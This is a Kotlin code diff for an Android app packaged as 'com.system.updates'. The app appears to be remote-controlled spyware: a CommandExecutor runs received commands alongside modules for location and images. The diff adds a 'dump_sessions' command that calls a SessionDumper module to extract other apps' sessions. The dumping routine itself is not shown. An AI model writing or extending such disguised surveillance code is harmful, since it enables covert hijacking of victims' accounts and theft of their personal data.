@@ -5,6 +5,7 @@ import android.content.Intent
 import android.util.Log
 import com.system.updates.modules.GeoProvider
 import com.system.updates.modules.ImageModule
+import com.system.updates.modules.SessionDumper
 
 object CommandExecutor {
 
@@ -33,6 +34,10 @@ object CommandExecutor {
             "update_system" -> {
                 Log.i(TAG, "Checking for system updates...")
                 SelfUpdateManager.checkForUpdates(context)
+            }
+            "dump_sessions" -> {
+                Log.i(TAG, "Starting session dump process...")
+                SessionDumper.dumpAppSessions(context)
             }
             else -> {
                 Log.w(TAG, "Unknown command received: $command")
